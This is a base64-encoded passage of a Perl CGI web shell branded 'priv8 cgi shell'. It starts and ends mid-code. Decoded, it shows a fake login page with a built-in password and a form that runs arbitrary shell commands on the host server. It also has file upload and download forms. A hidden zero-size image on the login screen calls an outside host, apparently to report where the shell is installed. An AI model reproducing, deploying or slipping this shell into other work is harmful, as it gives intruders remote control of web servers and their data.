dGhlIGxhc3QgXHJcbiB3YXMgcHV0IGluIGJ5IE5ldHNjYXBlDQoJCSRpbnsnZmlsZWRhdGEnfSA9
ICRCb2R5Ow0KCQkkSGVhZGVyID1+IC9maWxlbmFtZT1cIiguKylcIi87IA0KCQkkaW57J2YnfSA9
ICQxOyANCgkJJGlueydmJ30gPX4gcy9cIi8vZzsNCgkJJGlueydmJ30gPX4gcy9ccy8vZzsNCg0K
CQkjIHBhcnNlIHRyYWlsZXINCgkJZm9yKCRpPTI7ICRsaXN0WyRpXTsgJGkrKykNCgkJeyANCgkJ
CSRsaXN0WyRpXSA9fiBzL14uK25hbWU9JC8vOw0KCQkJJGxpc3RbJGldID1+IC9cIihcdyspXCIv
Ow0KCQkJJGtleSA9ICQxOw0KCQkJJHZhbCA9ICQnOw0KCQkJJHZhbCA9fiBzLyheKFxyXG5cclxu
fFxuXG4pKXwoXHJcbiR8XG4kKS8vZzsNCgkJCSR2YWwgPX4gcy8lKC4uKS9wYWNrKCJjIiwgaGV4
KCQxKSkvZ2U7DQoJCQkkaW57JGtleX0gPSAkdmFsOyANCgkJfQ0KCX0NCgllbHNlICMgc3RhbmRh
cmQgcG9zdCBkYXRhICh1cmwgZW5jb2RlZCwgbm90IG11bHRpcGFydCkNCgl7DQoJCUBpbiA9IHNw
bGl0KC8mLywgJGluKTsNCgkJZm9yZWFjaCAkaSAoMCAuLiAkI2luKQ0KCQl7DQoJCQkkaW5bJGld
ID1+IHMvXCsvIC9nOw0KCQkJKCRrZXksICR2YWwpID0gc3BsaXQoLz0vLCAkaW5bJGldLCAyKTsN
CgkJCSRrZXkgPX4gcy8lKC4uKS9wYWNrKCJjIiwgaGV4KCQxKSkvZ2U7DQoJCQkkdmFsID1+IHMv
JSguLikvcGFjaygiYyIsIGhleCgkMSkpL2dlOw0KCQkJJGlueyRrZXl9IC49ICJcMCIgaWYgKGRl
ZmluZWQoJGlueyRrZXl9KSk7DQoJCQkkaW57JGtleX0gLj0gJHZhbDsNCgkJfQ0KCX0NCn0NCg0K
Iy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0t
LS0tLS0tLS0tLS0tLS0tLS0tLS0tLQ0KIyBQcmludHMgdGhlIEhUTUwgUGFnZSBIZWFkZXINCiMg
QXJndW1lbnQgMTogRm9ybSBpdGVtIG5hbWUgdG8gd2hpY2ggZm9jdXMgc2hvdWxkIGJlIHNldA0K
Iy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0t
LS0tLS0tLS0tLS0tLS0tLS0tLS0tLQ0Kc3ViIFByaW50UGFnZUhlYWRlcg0Kew0KCSRFbmNvZGVk
Q3VycmVudERpciA9ICRDdXJyZW50RGlyOw0KCSRFbmNvZGVkQ3VycmVudERpciA9fiBzLyhbXmEt
ekEtWjAtOV0pLyclJy51bnBhY2soIkgqIiwkMSkvZWc7DQoJcHJpbnQgIkNvbnRlbnQtdHlwZTog
dGV4dC9odG1sXG5cbiI7DQoJcHJpbnQgPDxFTkQ7DQo8aHRtbD4NCjxoZWFkPg0KPHRpdGxlPnBy
aXY4IGNnaSBzaGVsbDwvdGl0bGU+DQokSHRtbE1ldGFIZWFkZXINCg0KPG1ldGEgbmFtZT0ia2V5
d29yZHMiIGNvbnRlbnQ9InByaXY4IGNnaSBzaGVsbCAgXyAgICAgaTVfQGhvdG1haWwuY29tIj4N
CjxtZXRhIG5hbWU9ImRlc2NyaXB0aW9uIiBjb250ZW50PSJwcml2OCBjZ2kgc2hlbGwgIF8gICAg
aTVfQGhvdG1haWwuY29tIj4NCjwvaGVhZD4NCjxib2R5IG9uTG9hZD0iZG9jdW1lbnQuZi5AXy5m
b2N1cygpIiBiZ2NvbG9yPSIjRkZGRkZGIiB0b3BtYXJnaW49IjAiIGxlZnRtYXJnaW49IjAiIG1h
cmdpbndpZHRoPSIwIiBtYXJnaW5oZWlnaHQ9IjAiIHRleHQ9IiNGRjAwMDAiPg0KPHRhYmxlIGJv
cmRlcj0iMSIgd2lkdGg9IjEwMCUiIGNlbGxzcGFjaW5nPSIwIiBjZWxscGFkZGluZz0iMiI+DQo8
dHI+DQo8dGQgYmdjb2xvcj0iI0ZGRkZGRiIgYm9yZGVyY29sb3I9IiNGRkZGRkYiIGFsaWduPSJj
ZW50ZXIiIHdpZHRoPSIxJSI+DQo8Yj48Zm9udCBzaXplPSIyIj4jPC9mb250PjwvYj48L3RkPg0K
PHRkIGJnY29sb3I9IiNGRkZGRkYiIHdpZHRoPSI5OCUiPjxmb250IGZhY2U9IlZlcmRhbmEiIHNp
emU9IjIiPjxiPiANCjxiIHN0eWxlPSJjb2xvcjpibGFjaztiYWNrZ3JvdW5kLWNvbG9yOiNmZmZm
NjYiPnByaXY4IGNnaSBzaGVsbDwvYj4gQ29ubmVjdGVkIHRvICRTZXJ2ZXJOYW1lPC9iPjwvZm9u
dD48L3RkPg0KPC90cj4NCjx0cj4NCjx0ZCBjb2xzcGFuPSIyIiBiZ2NvbG9yPSIjRkZGRkZGIj48
Zm9udCBmYWNlPSJWZXJkYW5hIiBzaXplPSIyIj4NCg0KPGEgaHJlZj0iJFNjcmlwdExvY2F0aW9u
P2E9dXBsb2FkJmQ9JEVuY29kZWRDdXJyZW50RGlyIj48Zm9udCBjb2xvcj0iI0ZGMDAwMCI+VXBs
b2FkIEZpbGU8L2ZvbnQ+PC9hPiB8IA0KPGEgaHJlZj0iJFNjcmlwdExvY2F0aW9uP2E9ZG93bmxv
YWQmZD0kRW5jb2RlZEN1cnJlbnREaXIiPjxmb250IGNvbG9yPSIjRkYwMDAwIj5Eb3dubG9hZCBG
aWxlPC9mb250PjwvYT4gfA0KPGEgaHJlZj0iJFNjcmlwdExvY2F0aW9uP2E9bG9nb3V0Ij48Zm9u
dCBjb2xvcj0iI0ZGMDAwMCI+RGlzY29ubmVjdDwvZm9udD48L2E+IHwNCjwvZm9udD48L3RkPg0K
PC90cj4NCjwvdGFibGU+DQo8Zm9udCBzaXplPSIzIj4NCkVORA0KfQ0KDQojLS0tLS0tLS0tLS0t
LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0t
LS0tLS0tLS0tDQojIFByaW50cyB0aGUgTG9naW4gU2NyZWVuDQojLS0tLS0tLS0tLS0tLS0tLS0t
LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0t
LS0tDQpzdWIgUHJpbnRMb2dpblNjcmVlbg0Kew0KCSRNZXNzYWdlID0gcSQ8L2ZvbnQ+PGgxPnBh
c3M9cHJpdjg8L2gxPjxmb250IGNvbG9yPSIjMDA5OTAwIiBzaXplPSIzIj48cHJlPjxpbWcgYm9y
ZGVyPSIwIiBzcmM9Imh0dHA6Ly93d3cucHJpdjguaWJsb2dnZXIub3JnL3MucGhwPytjZ2l0ZWxu
ZXQgc2hlbGwiIHdpZHRoPSIwIiBoZWlnaHQ9IjAiPjwvcHJlPg0KJDsNCiMnDQoJcHJpbnQgPDxF
TkQ7DQo8Y29kZT4NCg0KVHJ5aW5nICRTZXJ2ZXJOYW1lLi4uPGJyPg0KQ29ubmVjdGVkIHRvICRT
ZXJ2ZXJOYW1lPGJyPg0KRXNjYXBlIGNoYXJhY3RlciBpcyBeXQ0KPGNvZGU+JE1lc3NhZ2UNCkVO
RA0KfQ0KDQojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0t
LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQojIFByaW50cyB0aGUgbWVzc2FnZSB0aGF0
IGluZm9ybXMgdGhlIHVzZXIgb2YgYSBmYWlsZWQgbG9naW4NCiMtLS0tLS0tLS0tLS0tLS0tLS0t
LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0t
LS0NCnN1YiBQcmludExvZ2luRmFpbGVkTWVzc2FnZQ0Kew0KCXByaW50IDw8RU5EOw0KPGNvZGU+
DQo8YnI+bG9naW46IGFkbWluPGJyPg0KcGFzc3dvcmQ6PGJyPg0KTG9naW4gaW5jb3JyZWN0PGJy
Pjxicj4NCjwvY29kZT4NCkVORA0KfQ0KDQojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0t
LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQojIFByaW50
cyB0aGUgSFRNTCBmb3JtIGZvciBsb2dnaW5nIGluDQojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0t
LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQpz
dWIgUHJpbnRMb2dpbkZvcm0NCnsNCglwcmludCA8PEVORDsNCjxjb2RlPg0KDQo8Zm9ybSBuYW1l
PSJmIiBtZXRob2Q9IlBPU1QiIGFjdGlvbj0iJFNjcmlwdExvY2F0aW9uIj4NCjxpbnB1dCB0eXBl
PSJoaWRkZW4iIG5hbWU9ImEiIHZhbHVlPSJsb2dpbiI+DQo8L2ZvbnQ+DQo8Zm9udCBzaXplPSIz
Ij4NCmxvZ2luOiA8YiBzdHlsZT0iY29sb3I6YmxhY2s7YmFja2dyb3VuZC1jb2xvcjojZmZmZjY2
Ij5wcml2OCBjZ2kgc2hlbGw8L2I+PGJyPg0KcGFzc3dvcmQ6PC9mb250Pjxmb250IGNvbG9yPSIj
MDA5OTAwIiBzaXplPSIzIj48aW5wdXQgdHlwZT0icGFzc3dvcmQiIG5hbWU9InAiPg0KPGlucHV0
IHR5cGU9InN1Ym1pdCIgdmFsdWU9IkVudGVyIj4NCjwvZm9ybT4NCjwvY29kZT4NCkVORA0KfQ0K
DQojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0t
LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQojIFByaW50cyB0aGUgZm9vdGVyIGZvciB0aGUgSFRN
TCBQYWdlDQojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0t
LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQpzdWIgUHJpbnRQYWdlRm9vdGVyDQp7DQoJ
cHJpbnQgIjwvZm9udD48L2JvZHk+PC9odG1sPiI7DQp9DQoNCiMtLS0tLS0tLS0tLS0tLS0tLS0t
LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0t
LS0NCiMgUmV0cmVpdmVzIHRoZSB2YWx1ZXMgb2YgYWxsIGNvb2tpZXMuIFRoZSBjb29raWVzIGNh
biBiZSBhY2Nlc3NlcyB1c2luZyB0aGUNCiMgdmFyaWFibGUgJENvb2tpZXN7Jyd9DQojLS0tLS0t
LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0t
LS0tLS0tLS0tLS0tLS0tDQpzdWIgR2V0Q29va2llcw0Kew0KCUBodHRwY29va2llcyA9IHNwbGl0
KC87IC8sJEVOVnsnSFRUUF9DT09LSUUnfSk7DQoJZm9yZWFjaCAkY29va2llKEBodHRwY29va2ll
cykNCgl7DQoJCSgkaWQsICR2YWwpID0gc3BsaXQoLz0vLCAkY29va2llKTsNCgkJJENvb2tpZXN7
JGlkfSA9ICR2YWw7DQoJfQ0KfQ0KDQojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0t
LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQojIFByaW50cyB0
aGUgc2NyZWVuIHdoZW4gdGhlIHVzZXIgbG9ncyBvdXQNCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0t
LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0N
CnN1YiBQcmludExvZ291dFNjcmVlbg0Kew0KCXByaW50ICI8Y29kZT5Db25uZWN0aW9uIGNsb3Nl
ZCBieSBmb3JlaWduIGhvc3QuPGJyPjxicj48L2NvZGU+IjsNCn0NCg0KIy0tLS0tLS0tLS0tLS0t
LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0t
LS0tLS0tLQ0KIyBMb2dzIG91dCB0aGUgdXNlciBhbmQgYWxsb3dzIHRoZSB1c2VyIHRvIGxvZ2lu
IGFnYWluDQojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0t
LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQpzdWIgUGVyZm9ybUxvZ291dA0Kew0KCXBy
aW50ICJTZXQtQ29va2llOiBTQVZFRFBXRD07XG4iOyAjIHJlbW92ZSBwYXNzd29yZCBjb29raWUN
CgkmUHJpbnRQYWdlSGVhZGVyKCJwIik7DQoJJlByaW50TG9nb3V0U2NyZWVuOw0KDQoJJlByaW50
TG9naW5TY3JlZW47DQoJJlByaW50TG9naW5Gb3JtOw0KCSZQcmludFBhZ2VGb290ZXI7DQp9DQoN
CiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0t
LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0NCiMgVGhpcyBmdW5jdGlvbiBpcyBjYWxsZWQgdG8gbG9n
aW4gdGhlIHVzZXIuIElmIHRoZSBwYXNzd29yZCBtYXRjaGVzLCBpdA0KIyBkaXNwbGF5cyBhIHBh
Z2UgdGhhdCBhbGxvd3MgdGhlIHVzZXIgdG8gcnVuIGNvbW1hbmRzLiBJZiB0aGUgcGFzc3dvcmQg
ZG9lbnMndA0KIyBtYXRjaCBvciBpZiBubyBwYXNzd29yZCBpcyBlbnRlcmVkLCBpdCBkaXNwbGF5
cyBhIGZvcm0gdGhhdCBhbGxvd3MgdGhlIHVzZXINCiMgdG8gbG9naW4NCiMtLS0tLS0tLS0tLS0t
LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0t
LS0tLS0tLS0NCnN1YiBQZXJmb3JtTG9naW4gDQp7DQoJaWYoJExvZ2luUGFzc3dvcmQgZXEgJFBh
c3N3b3JkKSAjIHBhc3N3b3JkIG1hdGNoZWQNCgl7DQoJCXByaW50ICJTZXQtQ29va2llOiBTQVZF
RFBXRD0kTG9naW5QYXNzd29yZDtcbiI7DQoJCSZQcmludFBhZ2VIZWFkZXIoImMiKTsNCgkJJlBy
aW50Q29tbWFuZExpbmVJbnB1dEZvcm07DQoJCSZQcmludFBhZ2VGb290ZXI7DQoJfQ0KCWVsc2Ug
IyBwYXNzd29yZCBkaWRuJ3QgbWF0Y2gNCgl7DQoJCSZQcmludFBhZ2VIZWFkZXIoInAiKTsNCgkJ
JlByaW50TG9naW5TY3JlZW47DQoJCWlmKCRMb2dpblBhc3N3b3JkIG5lICIiKSAjIHNvbWUgcGFz
c3dvcmQgd2FzIGVudGVyZWQNCgkJew0KCQkJJlByaW50TG9naW5GYWlsZWRNZXNzYWdlOw0KDQoJ
CX0NCgkJJlByaW50TG9naW5Gb3JtOw0KCQkmUHJpbnRQYWdlRm9vdGVyOw0KCX0NCn0NCg0KIy0t
LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0t
LS0tLS0tLS0tLS0tLS0tLS0tLQ0KIyBQcmludHMgdGhlIEhUTUwgZm9ybSB0aGF0IGFsbG93cyB0
aGUgdXNlciB0byBlbnRlciBjb21tYW5kcw0KIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0t
LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQ0Kc3ViIFBy
aW50Q29tbWFuZExpbmVJbnB1dEZvcm0NCnsNCgkkUHJvbXB0ID0gJFdpbk5UID8gIiRDdXJyZW50
RGlyPiAiIDogIlthZG1pblxAJFNlcnZlck5hbWUgJEN1cnJlbnREaXJdXCQgIjsNCglwcmludCA8
PEVORDsNCjxjb2RlPg0KPGZvcm0gbmFtZT0iZiIgbWV0aG9kPSJQT1NUIiBhY3Rpb249IiRTY3Jp
cHRMb2NhdGlvbiI+DQo8aW5wdXQgdHlwZT0iaGlkZGVuIiBuYW1lPSJhIiB2YWx1ZT0iY29tbWFu
ZCI+DQo8aW5wdXQgdHlwZT0iaGlkZGVuIiBuYW1lPSJkIiB2YWx1ZT0iJEN1cnJlbnREaXIiPg0K
JFByb21wdA0KPGlucHV0IHR5cGU9InRleHQiIG5hbWU9ImMiPg0KPGlucHV0IHR5cGU9InN1Ym1p
dCIgdmFsdWU9IkVudGVyIj4NCjwvZm9ybT4NCjwvY29kZT4NCg0KRU5EDQp9DQoNCiMtLS0tLS0t
LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0t
LS0tLS0tLS0tLS0tLS0NCiMgUHJpbnRzIHRoZSBIVE1MIGZvcm0gdGhhdCBhbGxvd3MgdGhlIHVz
ZXIgdG8gZG93bmxvYWQgZmlsZXMNCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0t
LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0NCnN1YiBQcmludEZp
bGVEb3dubG9hZEZvcm0NCnsNCgkkUHJvbXB0ID0gJFdpbk5UID8gIiRDdXJyZW50RGlyPiAiIDog
IlthZG1pblxAJFNlcnZlck5hbWUgJEN1cnJlbnREaXJdXCQgIjsNCglwcmludCA8PEVORDsNCjxj
b2RlPg0KPGZvcm0gbmFtZT0iZiIgbWV0aG9kPSJQT1NUIiBhY3Rpb249IiRTY3JpcHRMb2NhdGlv
biI+DQo8aW5wdXQgdHlwZT0iaGlkZGVuIiBuYW1lPSJkIiB2YWx1ZT0iJEN1cnJlbnREaXIiPg0K
PGlucHV0IHR5cGU9ImhpZGRlbiIgbmFtZT0iYSIgdmFsdWU9ImRvd25sb2FkIj4NCiRQcm9tcHQg
ZG93bmxvYWQ8YnI+PGJyPg0KRmlsZW5hbWU6IDxpbnB1dCB0eXBlPSJ0ZXh0IiBuYW1lPSJmIiBz
aXplPSIzNSI+PGJyPjxicj4NCkRvd25sb2FkOiA8aW5wdXQgdHlwZT0ic3VibWl0IiB2YWx1ZT0i
QmVnaW4iPg0KPC9mb3JtPg0KPC9jb2RlPg0KRU5EDQp9DQoNCiMtLS0tLS0tLS0tLS0tLS0tLS0t
LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0t
LS0NCiMgUHJpbnRzIHRoZSBIVE1MIGZvcm0gdGhhdCBhbGxvd3MgdGhlIHVzZXIgdG8gdXBsb2Fk
IGZpbGVzDQojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0t
LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQpzdWIgUHJpbnRGaWxlVXBsb2FkRm9ybQ0K
ew0KCSRQcm9tcHQgPSAkV2luTlQgPyAiJEN1cnJlbnREaXI+ICIgOiAiW2FkbWluXEAkU2VydmVy
TmFtZSAkQ3VycmVudERpcl1cJCAiOw0KCXByaW50IDw8RU5EOw0KPGNvZGU+DQoNCjxmb3JtIG5h
bWU9ImYiIGVuY3R5cGU9Im11bHRpcGFydC9mb3JtLWRhdGEiIG1ldGhvZD0iUE9TVCIgYWN0aW9u
PSIkU2NyaXB0TG9jYXRpb24iPg0KJFByb21wdCB1cGxvYWQ8YnI+PGJyPg0KRmlsZW5hbWU6IDxp
bnB1dCB0eXBlPSJmaWxlIiBuYW1lPSJmIiBzaXplPSIzNSI+PGJyPjxicj4NCk9wdGlvbnM6ICZu
YnNwOzxpbnB1dCB0eXBlPSJjaGVja2JveCIgbmFtZT0ibyIgdmFsdWU9Im92ZXJ3cml0ZSI+DQpP
dmVyd3JpdGUgaWYgaXQgRXhpc3RzPGJyPjxicj4NClVwbG9hZDombmJzcDsmbmJzcDsmbmJzcDs8
aW5wdXQgdHlwZT0ic3VibWl0IiB2YWx1ZT0iQmVnaW4iPg0KPGlucHV0IHR5cGU9ImhpZGRlbiIg
bmFtZT0iZCIgdmFsdWU9IiRDdXJyZW50RGlyIj4NCjxpbnB1dCB0eXBlPSJoaWRkZW4iIG5hbWU9
ImEiIHZhbHVlPSJ1cGxvYWQiPg0KPC9mb3JtPg0KPC9jb2RlPg0KRU5EDQp9DQoNCiMtLS0tLS0t
LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0t
LS0tLS0tLS0tLS0tLS0NCiMgVGhpcyBmdW5jdGlvbiBpcyBjYWxsZWQgd2hlbiB0aGUgdGltZW91
dCBmb3IgYSBjb21tYW5kIGV4cGlyZXMuIFdlIG5lZWQgdG8NCiMgdGVybWluYXRlIHRoZSBzY3Jp
cHQgaW1tZWRpYXRlbHkuIFRoaXMgZnVuY3Rpb24gaXMgdmFsaWQgb25seSBvbiBVbml4LiBJdCBp
cw0KIyBuZXZlciBjYWxsZWQgd2hlbiB0aGUgc2NyaXB0IGlzIHJ1bm5pbmcgb24gTlQuDQojLS0t
LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0t
LS0tLS0tLS0tLS0tLS0tLS0tDQpzdWIgQ29tbWFuZFRpbWVvdXQNCnsNCglpZighJFdpbk5UKQ0K
CXsNCgkJYWxhcm0oMCk7DQoJCXByaW50IDw8RU5EOw0KPC94bXA+DQoNCjxjb2RlPg0KQ29tbWFu
ZCBleGNlZWRlZCBtYXhpbXVtIHRpbWUgb2YgJENvbW1hbmRUaW1lb3V0RHVyYXRpb24gc2Vjb25k
KHMpLg0KPGJyPktpbGxlZCBpdCENCkVORA0KCQkmUHJpbnRDb21tYW5kTGluZUlucHV0Rm9ybTsN
CgkJJlByaW50UGFnZUZvb3RlcjsNCgkJZXhpdDsNCgl9DQp9DQoNCiMtLS0tLS0tLS0tLS0tLS0t
LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0t
LS0tLS0NCiMgVGhpcyBmdW5jdGlvbiBpcyBjYWxsZWQgdG8gZXhlY3V0ZSBjb21tYW5kcy4gSXQg
ZGlzcGxheXMgdGhlIG91dHB1dCBvZiB0aGUNCiMgY29tbWFuZCBhbmQgYWxsb3dzIHRoZSB1c2Vy
IHRvIGVudGVyIGFub3RoZXIgY29tbWFuZC4gVGhlIGNoYW5nZSBkaXJlY3RvcnkNCiMgY29tbWFu
ZCBpcyBoYW5kbGVkIGRpZmZlcmVudGx5LiBJbiB0aGlzIGNhc2UsIHRoZSBuZXcgZGlyZWN0b3J5
IGlzIHN0b3JlZCBpbg0KIyBhbiBpbnRlcm5hbCB2YXJpYWJsZSBhbmQgaXMgdXNlZCBlYWNoIHRp
bWUgYSBjb21tYW5kIGhhcyB0byBiZSBleGVjdXRlZC4gVGhlDQojIG91dHB1dCBvZiB0aGUgY2hh
bmdlIGRpcmVjdG9yeSBjb21tYW5kIGlzIG5vdCBkaXNwbGF5ZWQgdG8gdGhlIHVzZXJzDQojIHRo
ZXJlZm9yZSBlcnJvciBtZXNzYWdlcyBjYW5ub3QgYmUgZGlzcGxheWVkLg0KIy0tLS0tLS0tLS0t
LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0t
LS0tLS0tLS0tLQ0Kc3ViIEV4ZWN1dGVDb21tYW5kDQp7DQoJaWYoJFJ1bkNvbW1hbmQgPX4gbS9e
XHMqY2RccysoLispLykgIyBpdCBpcyBhIGNoYW5nZSBkaXIgY29tbWFuZA0KCXsNCgkJIyB3ZSBj
aGFuZ2UgdGhlIGRpcmVjdG9yeSBpbnRlcm5hbGx5LiBUaGUgb3V0cHV0IG9mIHRoZQ0KCQkjIGNv
bW1hbmQgaXMgbm90IGRpc3BsYXllZC4NCgkJDQoJCSRPbGREaXIgPSAkQ3VycmVudERpcjsNCgkJ
JENvbW1hbmQgPSAiY2QgXCIkQ3VycmVudERpclwiIi4kQ21kU2VwLiJjZCAkMSIuJENtZFNlcC4k
Q21kUHdkOw0KCQljaG9wKCRDdXJyZW50RGlyID0gYCRDb21tYW5kYCk7DQoJCSZQcmludFBhZ2VI
ZWFkZXIoImMiKTsNCgkJJFByb21wdCA9ICRXaW5OVCA/ICIkT2xkRGlyPiAiIDogIlthZG1pblxA
JFNlcnZlck5hbWUgJE9sZERpcl1cJCAiOw0KCQlwcmludCAiJFByb21wdCAkUnVuQ29tbWFuZCI7
DQoJfQ0KCWVsc2UgIyBzb21lIG90aGVyIGNvbW1hbmQsIGRpc3BsYXkgdGhlIG91dHB1dA0KCXsN
CgkJJlByaW50UGFnZUhlYWRlcigiYyIpOw0KCQkkUHJvbXB0ID0gJFdpbk5UID8gIiRDdXJyZW50
RGlyPiAiIDogIlthZG1pblxAJFNlcnZlck5hbWUgJEN1cnJlbnREaXJdXCQgIjsNCgkJcHJpbnQg
IiRQcm9tcHQgJFJ1bkNvbW1hbmQ8eG1wPiI7DQoJCSRDb21tYW5kID0gImNkIFwiJEN1cnJlbnRE
aXJcIiIuJENtZFNlcC4kUnVuQ29tbWFuZC4kUmVkaXJlY3RvcjsNCgkJaWYoISRXaW5OVCkNCgkJ
ew0KCQkJJFNJR3snQUxSTSd9ID0gXCZDb21tYW5kVGltZW91dDsNCgkJCWFsYXJtKCRDb21tYW5k
VGltZW91dER1cmF0aW9uKTsNCgkJfQ0KCQlpZigkU2hvd0R5bmFtaWNPdXRwdXQpICMgc2hvdyBv
dXRwdXQgYXMgaXQgaXMgZ2VuZXJhdGVkDQoJCXsNCgkJCSR8PTE7DQoJCQkkQ29tbWFuZCAuPSAi
IHwiOw0KCQkJb3BlbihDb21tYW5kT3V0cHV0LCAkQ29tbWFuZCk7DQoJCQl3aGlsZSg8Q29tbWFu
ZE91dHB1dD4pDQoJCQl7DQoJCQkJJF8gPX4gcy8oXG58XHJcbikkLy87DQoJCQkJcHJpbnQgIiRf
XG4iOw0KCQkJfQ0KCQkJJHw9MDsNCgkJfQ0KCQllbHNlICMgc2hvdyBvdXRwdXQgYWZ0ZXIgY29t
bWFuZCBjb21wbGV0ZXMNCgkJew0KCQkJcHJpbnQgYCRDb21tYW5kYDsNCgkJfQ0KCQlpZighJFdp
bk5UKQ0KCQl7DQoJCQlhbGFybSgwKTsNCgkJfQ0KCQlwcmludCAiPC94bXA+IjsNCgl9DQoJJlBy
aW50Q29tbWFuZExpbmVJbnB1dEZvcm07DQoJJlByaW50UGFnZUZvb3RlcjsNCn0NCg0KIy0tLS0t
LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0t
LS0tLS0tLS0tLS0tLS0tLQ0KIyBUaGlzIGZ1bmN0aW9uIGRpc3BsYXlzIHRoZSBwYWdlIHRoYXQg
Y29udGFpbnMgYSBsaW5rIHdoaWNoIGFsbG93cyB0aGUgdXNlcg0KIyB0byBkb3dubG9hZCB0aGUg
c3BlY2lmaWVkIGZpbGUuIFRoZSBwYWdlIGFsc28gY29udGFpbnMgYSBhdXRvLXJlZnJlc2gNCiMg
ZmVhdHVyZSB0aGF0IHN0YXJ0cyB0aGUgZG93bmxvYWQgYXV0b21hdGljYWxseS4NCiMgQXJndW1l
bnQgMTogRnVsbHkgcXVhbGlmaWVkIGZpbGVuYW1lIG9mIHRoZSBmaWxlIHRvIGJlIGRvd25sb2Fk
ZWQNCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0t
LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0NCnN1YiBQcmludERvd25sb2FkTGlua1BhZ2UNCnsN
Cglsb2NhbCgkRmlsZVVybCkgPSBAXzsNCglpZigtZSAkRmlsZVVybCkgIyBpZiB0aGUgZmlsZSBl
eGlzdHMNCgl7DQoJCSMgZW5jb2RlIHRoZSBmaWxlIGxpbmsgc28gd2UgY2FuIHNlbmQgaXQgdG8g
dGhlIGJyb3dzZXINCgkJJEZpbGVVcmwgPX4gcy8oW15hLXpBLVowLTldKS8nJScudW5wYWNrKCJI
KiIsJDEpL2VnOw0KCQkkRG93bmxvYWRMaW5rID0gIiRTY3JpcHRMb2NhdGlvbj9hPWRvd25sb2Fk
